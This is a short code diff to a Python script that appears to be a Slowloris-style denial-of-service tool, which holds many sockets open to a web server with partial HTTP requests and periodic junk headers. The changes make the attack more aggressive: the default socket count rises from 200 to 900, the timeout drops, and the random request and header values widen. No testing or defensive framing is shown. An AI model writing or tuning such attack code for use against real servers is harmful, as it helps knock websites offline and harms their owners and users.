@@ -16,7 +16,7 @@ parser.add_argument(
 parser.add_argument(
     "-s",
     "--sockets",
-    default=200,
+    default=900,
     help="Number of sockets to use in the test",
     type=int,
 )
@@ -155,7 +155,7 @@ setattr(socket.socket, "send_header", send_header)
 
 def init_socket(ip):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout(15)
+    s.settimeout(10)
 
     if args.https:
         ctx = ssl.create_default_context()
@@ -163,7 +163,7 @@ def init_socket(ip):
 
     s.connect((ip, args.port))
 
-    s.send_line(f"GET /?{random.randint(0, 5000)} HTTP/1.1")
+    s.send_line(f"GET /?{random.randint(9000, 5000000)} HTTP/1.1")
 
     ua = user_agents[0]
     if args.randuseragent:
@@ -197,7 +197,7 @@ def main():
             )
             for s in list(list_of_sockets):
                 try:
-                    s.send_header("X-a", random.randint(2, 9000))
+                    s.send_header("X-a", random.randint(10000, 9000000))
                 except socket.error:
                     list_of_sockets.remove(s)
 
